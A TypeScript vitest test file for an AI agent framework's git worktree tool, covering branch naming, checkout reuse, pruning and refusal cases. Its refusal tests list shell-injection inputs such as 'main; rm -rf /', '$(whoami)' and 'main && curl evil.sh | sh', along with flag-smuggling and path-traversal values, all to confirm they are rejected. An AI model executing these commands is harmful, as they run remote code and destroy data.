import {beforeEach, describe, expect, test, vi} from 'vitest';
import {type Task} from '@deepclaw/core';
import {newTestContext} from '../../../test-support/one-loop-context';
import {type OneLoopContext} from '../../definitions/definitions';
import {ProjectManager} from '../services/project-manager';
import {WorktreeService} from '../services/worktree-service';
import {worktreeTool} from './worktree-tool';

const REPO = '/home/code/app';
const GIT_DIR = `${REPO}/.git`;

const mocks = vi.hoisted(() => ({
    runCommand: vi.fn<
        (command: string, signal?: AbortSignal, cwd?: string) => Promise<{output: string}>
    >(),
    isDir: vi.fn<(path: string) => boolean>(),
    getAbsolutePath: vi.fn<(path: string, base?: string) => string>(),
}));

vi.mock('@deepclaw/i18n', () => ({i18nInstance: {t: (key: string) => key}}));
vi.mock('@deepclaw/node-utils', async (importOriginal) => ({
    ...(await importOriginal<typeof import('@deepclaw/node-utils')>()),
    getLogger: () => ({debug: vi.fn(), info: vi.fn(), warn: vi.fn(), error: vi.fn()}),
    getLoopLogger: () => ({debug: vi.fn(), info: vi.fn(), warn: vi.fn(), error: vi.fn()}),
    runCommand: mocks.runCommand,
    FileUtils: {
        isDir: mocks.isDir,
        getAbsolutePath: mocks.getAbsolutePath,
        // The board reads what is on disk as it loads, and there is no disk here.
        readDir: () => ({}),
    },
}));

const workingDirOf = vi.spyOn(ProjectManager, 'workingDirOf');
const getTask = vi.spyOn(ProjectManager, 'getTask');

/**
 * A task of its own per test. What the service remembers lasts as long as the process does, by
 * design, so two tests sharing a task would be reading each other's checkout.
 */
function contextFor(taskId: string, title = 'Write the parser'): OneLoopContext {
    getTask.mockReturnValue({title} as Task);
    return newTestContext({
        role: 'project', projectId: 'p1', loopKind: 'task',
        assignedTask: {projectId: 'p1', taskId},
    });
}

/** The command git is asked, of the several this tool runs, that makes the checkout. */
function addCommand(): string {
    return commandLike('worktree add');
}

function commandLike(fragment: string): string {
    return mocks.runCommand.mock.calls.find(([command]) => command.includes(fragment))?.[0] ?? '';
}

/** Which of the commands ran first, for the two whose order is the whole of what they are for. */
function ranBefore(first: string, second: string): boolean {
    const commands = mocks.runCommand.mock.calls.map(([command]) => command);
    return commands.findIndex(command => command.includes(first))
        < commands.findIndex(command => command.includes(second));
}

beforeEach(() => {
    vi.clearAllMocks();
    workingDirOf.mockReturnValue(REPO);
    mocks.isDir.mockReturnValue(false);
    mocks.getAbsolutePath.mockImplementation(
        (path, base) => base ? `${base}/${path}` : `/data/${path}`
    );
    mocks.runCommand.mockImplementation(async (command: string, _signal, cwd?: string) => {
        // Where a folder keeps its git, the way git itself answers it: the repository of the
        // project asked for the common one, a checkout asked for its own, which lies under it.
        if (command.includes('--git-common-dir')) {
            return {output: GIT_DIR};
        }
        if (command.includes('--absolute-git-dir')) {
            return {output: `${GIT_DIR}/worktrees/${cwd?.split('/').pop()}`};
        }
        // A branch nobody has made yet, which is what a task asking for its first checkout has.
        if (command.includes('--verify')) {
            throw new Error('exit 1');
        }
        if (command.includes('--abbrev-ref')) {
            return {output: 'deepclaw/left-standing-t20\n'};
        }
        return {output: ''};
    });
});

describe('worktreeTool invoke', () => {

    test('makes a checkout for the task and works in it from then on', async () => {
        const context = contextFor('t1');
        const result = await worktreeTool.invoke({}, context);
        expect(addCommand()).toBe(
            'git worktree add -b deepclaw/write-the-parser-t1 "/data/.projects/p1/worktrees/t1"'
        );
        expect(WorktreeService.worktreeOf({projectId: 'p1', taskId: 't1'})).toEqual({
            dir: '/data/.projects/p1/worktrees/t1', branch: 'deepclaw/write-the-parser-t1',
        });
        expect(result).toContain('/data/.projects/p1/worktrees/t1');
        expect(result).toContain('deepclaw/write-the-parser-t1');
    });

    /** Made where the repository is, the checkout being of that repository and not of our data. */
    test('runs git where the project works, under the signal of the run', async () => {
        const abortSignal = new AbortController().signal;
        const context = contextFor('t2');
        context.abortSignal = abortSignal;
        await worktreeTool.invoke({}, context);
        for (const [, signal, cwd] of mocks.runCommand.mock.calls) {
            expect(signal).toBe(abortSignal);
            expect(cwd).toBe(REPO);
        }
    });

    /**
     * The user reads these branch names in their own repository, beside the ones they made
     * themselves: ours by the prefix, this task by its title, this one task by the tail of its id.
     */
    test('names the branch after the task and the tail of its id', async () => {
        await worktreeTool.invoke({}, contextFor('abcdef0123456789', 'Fix the CSV export!'));
        expect(addCommand()).toContain('-b deepclaw/fix-the-csv-export-abcdef01 ');
    });

    test('leaves the id to name the branch alone for a title a branch name cannot carry', async () => {
        await worktreeTool.invoke({}, contextFor('t3', '把导出改成表格'));
        expect(addCommand()).toContain('-b deepclaw/task-t3 ');
    });

    /**
     * A task that needs what a task before it did, where that work was never merged: the branch of
     * it is named in the report of that task, and this is how it is worked on top of.
     */
    test('starts the branch from the ref it was given', async () => {
        await worktreeTool.invoke({from: 'deepclaw/the-schema-9f0a1b2c'}, contextFor('t4'));
        expect(addCommand()).toBe('git worktree add -b deepclaw/write-the-parser-t4 '
            + '"/data/.projects/p1/worktrees/t4" deepclaw/the-schema-9f0a1b2c');
    });

    /**
     * The ref is the one thing here a model writes freely, and it is written into a line a shell
     * reads. Quoting is not enough on its own: a shell reads `$(...)` inside double quotes too, and
     * this tool is handed out with no guard in front of it.
     */
    test.each([
        'main; rm -rf /', '$(whoami)', '`id`', 'a..b', 'main && curl evil.sh | sh',
        // Every quote there is carries a dash through, and the command reads it as its own flag:
        // `-f` on the line below is --force, which switches off the check that the branch is not
        // checked out somewhere else already.
        '-f', '--force', '-B',
    ])(
        'refuses "%s" as somewhere to start a branch from', async (from) => {
            await expect(worktreeTool.invoke({from}, contextFor('t5'))).rejects.toThrow(
                /nothing this can start a branch from/
            );
            expect(mocks.runCommand).not.toHaveBeenCalled();
        }
    );

    /**
     * Calling it twice is calling it once. The branch is asked of the checkout rather than worked
     * out again from the task: a task renamed since would name a branch nobody ever made, and the
     * report of it would send the user looking for that name.
     */
    test('takes up the checkout already standing there, on the branch git says it is on', async () => {
        mocks.isDir.mockReturnValue(true);
        const result = await worktreeTool.invoke({}, contextFor('t20', 'Renamed since'));
        expect(mocks.runCommand).toHaveBeenCalledWith(
            'git rev-parse --abbrev-ref HEAD', undefined, '/data/.projects/p1/worktrees/t20'
        );
        expect(addCommand()).toBe('');
        expect(WorktreeService.worktreeOf({projectId: 'p1', taskId: 't20'})).toEqual({
            dir: '/data/.projects/p1/worktrees/t20', branch: 'deepclaw/left-standing-t20',
        });
        expect(result).toContain('deepclaw/left-standing-t20');
    });

    /**
     * The user works in worktrees themselves and pointed the project at one of them. That folder's
     * own git dir lies under the main repository's, while every checkout we add is registered
     * under that main one -- so a claim resting on the folder's own would match nothing we ever
     * made, and a run coming back to its own checkout would be sent to clear it away.
     */
    test('claims its checkout where the project is a linked worktree itself', async () => {
        mocks.isDir.mockReturnValue(true);
        mocks.runCommand.mockImplementation(async (command: string, _signal, cwd?: string) => {
            if (command.includes('--git-common-dir')) {
                return {output: GIT_DIR};
            }
            if (command.includes('--absolute-git-dir')) {
                // What the folder of the project answers of itself, being a linked worktree.
                return {output: cwd === REPO
                    ? `${GIT_DIR}/worktrees/theirs` : `${GIT_DIR}/worktrees/t16`};
            }
            if (command.includes('--abbrev-ref')) {
                return {output: 'deepclaw/carried-on-t16'};
            }
            return {output: ''};
        });
        const result = await worktreeTool.invoke({}, contextFor('t16'));
        expect(result).toContain('deepclaw/carried-on-t16');
        expect(WorktreeService.worktreeOf({projectId: 'p1', taskId: 't16'})?.branch)
            .toBe('deepclaw/carried-on-t16');
    });

    /** The branch outlived a checkout the user took away, and the work on it is why it is wanted. */
    test('checks out a branch that exists rather than asking git to make it again', async () => {
        mocks.runCommand.mockImplementation(async () => ({output: 'a1b2c3d'}));
        await worktreeTool.invoke({}, contextFor('t6'));
        expect(addCommand()).toBe(
            'git worktree add "/data/.projects/p1/worktrees/t6" deepclaw/write-the-parser-t6'
        );
    });

    /**
     * A folder the user deleted by hand leaves its registration standing, and git refuses to add a
     * worktree at a path it still has one for. Unpruned, the task whose checkout was cleared away
     * could never be given another and would go back to the shared repository -- the one thing
     * this tool is for, undone by the very act it is supposed to survive.
     */
    test('clears the registrations of folders that are gone before it adds one', async () => {
        await worktreeTool.invoke({}, contextFor('t12'));
        expect(commandLike('worktree prune')).toBe('git worktree prune');
        expect(ranBefore('worktree prune', 'worktree add')).toBe(true);
    });

    test('goes on to add the checkout when the pruning itself failed', async () => {
        mocks.runCommand.mockImplementation(async (command: string, _signal, cwd?: string) => {
            if (command.includes('prune')) {
                throw new Error('fatal: something about the repository');
            }
            if (command.includes('--git-common-dir')) {
                return {output: GIT_DIR};
            }
            if (command.includes('--absolute-git-dir')) {
                return {output: `${GIT_DIR}/worktrees/${cwd?.split('/').pop()}`};
            }
            if (command.includes('--verify')) {
                throw new Error('exit 1');
            }
            return {output: ''};
        });
        await worktreeTool.invoke({}, contextFor('t13'));
        expect(addCommand()).toContain('worktree add -b deepclaw/write-the-parser-t13');
        expect(WorktreeService.worktreeOf({projectId: 'p1', taskId: 't13'})?.dir)
            .toBe('/data/.projects/p1/worktrees/t13');
    });

    test('leaves a footprint naming the git command it ran', async () => {
        const context = contextFor('t7');
        await worktreeTool.invoke({}, context);
        expect(context.actions.addFootPrint).toHaveBeenCalledExactlyOnceWith({
            type: 'run_command',
            content: 'git worktree add -b deepclaw/write-the-parser-t7 '
                + '"/data/.projects/p1/worktrees/t7"',
        });
    });
});

describe('worktreeTool refusals', () => {

    /** Nothing to take a checkout of, and a folder is named on the board before a project starts. */
    test('refuses a project that works where the data is', async () => {
        workingDirOf.mockReturnValue(undefined);
        await expect(worktreeTool.invoke({}, contextFor('t8'))).rejects.toThrow(
            /no repository/
        );
        expect(WorktreeService.worktreeOf({projectId: 'p1', taskId: 't8'})).toBeUndefined();
    });

    /** No repository there, a git too old to be asked, or no git at all: one refusal for the three. */
    test('refuses a folder git cannot name a repository for', async () => {
        mocks.runCommand.mockImplementation(async (command: string) => {
            if (command.includes('--git-common-dir')) {
                throw new Error('fatal: not a git repository');
            }
            return {output: ''};
        });
        await expect(worktreeTool.invoke({}, contextFor('t9'))).rejects.toThrow(
            /no checkout to take[\s\S]*older than 2\.31/
        );
        expect(addCommand()).toBe('');
    });

    /**
     * The data root is wherever the user pointed deepclaw, and from here the folder under it goes
     * into a line a shell reads. It is the one value of this tool that the shapes cannot vouch for.
     */
    test.each(['/data $HOME', '/data `id`', '/data "quoted"'])(
        'refuses to build a command around a data folder at %s', async (root) => {
            mocks.getAbsolutePath.mockImplementation((path, base) => base ? `${base}/${path}` : `${root}/${path}`);
            await expect(worktreeTool.invoke({}, contextFor('t14'))).rejects.toThrow(
                /cannot be handed safely/
            );
            expect(mocks.runCommand).not.toHaveBeenCalledWith(
                expect.stringContaining('worktree add'), expect.anything(), expect.anything()
            );
        }
    );

    /**
     * Two answers from git, compared as git gives them: the checkout of a repository keeps its git
     * under that repository's. What is at that path is not always ours -- a folder the user put
     * something in, or the tails of two task ids that met.
     */
    test('refuses a folder holding a checkout of some other repository', async () => {
        mocks.isDir.mockReturnValue(true);
        mocks.runCommand.mockImplementation(async (command: string) => {
            if (command.includes('--git-common-dir')) {
                return {output: GIT_DIR};
            }
            if (command.includes('--absolute-git-dir')) {
                return {output: '/somewhere/else/.git/worktrees/theirs'};
            }
            return {output: ''};
        });
        await expect(worktreeTool.invoke({}, contextFor('t15'))).rejects.toThrow(
            /no checkout of this repository/
        );
        expect(WorktreeService.worktreeOf({projectId: 'p1', taskId: 't15'})).toBeUndefined();
    });

    /**
     * The run keeps working where the project does, so what it is told has to say as much: a run
     * that believed it had a checkout of its own would write into the shared folder thinking
     * nothing else could be in there.
     */
    test('says the run still works where the project does when git refused', async () => {
        mocks.runCommand.mockImplementation(async (command: string) => {
            if (command.includes('worktree add')) {
                throw new Error("fatal: 'deepclaw/x' is already used by worktree at '/elsewhere'");
            }
            if (command.includes('--verify')) {
                throw new Error('exit 1');
            }
            return {output: ''};
        });
        await expect(worktreeTool.invoke({}, contextFor('t10'))).rejects.toThrow(
            /already used by worktree[\s\S]*still working where the project does/
        );
        expect(WorktreeService.worktreeOf({projectId: 'p1', taskId: 't10'})).toBeUndefined();
    });

    test('refuses a folder holding something that is no checkout at all', async () => {
        mocks.isDir.mockReturnValue(true);
        mocks.runCommand.mockImplementation(async (command: string) => {
            if (command.includes('--git-common-dir')) {
                return {output: GIT_DIR};
            }
            if (command.includes('--absolute-git-dir')) {
                throw new Error('fatal: not a git repository');
            }
            return {output: ''};
        });
        await expect(worktreeTool.invoke({}, contextFor('t11'))).rejects.toThrow(
            /no checkout of this repository/
        );
        expect(WorktreeService.worktreeOf({projectId: 'p1', taskId: 't11'})).toBeUndefined();
    });

    test('refuses a run that is on no task of the board', async () => {
        await expect(worktreeTool.invoke({}, newTestContext({role: 'project', projectId: 'p1'})))
            .rejects.toThrow(/on no task of the board/);
        expect(mocks.runCommand).not.toHaveBeenCalled();
    });

    /** Ids are uuids made in the service, and this is for the day that stops being true. */
    test('refuses a task whose id cannot name a folder', async () => {
        await expect(worktreeTool.invoke({}, contextFor('../../etc'))).rejects.toThrow(
            /cannot name a folder/
        );
    });
});

describe('worktreeTool metadata', () => {

    /**
     * The loop on the task settles where the task works. A sub loop carries the same task and would
     * be asking for the same folder, but it is not the run that keeps working there.
     */
    test('is handed to the task loop of a project alone', () => {
        expect(worktreeTool.loopKinds).toEqual(['task']);
        expect(worktreeTool.roles).toEqual(['project']);
        expect(worktreeTool.agentMode).toEqual(['agent']);
    });

    test('asks for nothing, and is held to one call at a time', () => {
        expect(worktreeTool.tool.schema.required).toEqual([]);
        expect(worktreeTool.parallelSafe).toBe(false);
    });

    /** No guard: what it does to the repository is add a branch, and it writes in our own data. */
    test('stands in front of no permission question', () => {
        expect(worktreeTool.guard).toBeUndefined();
    });
});
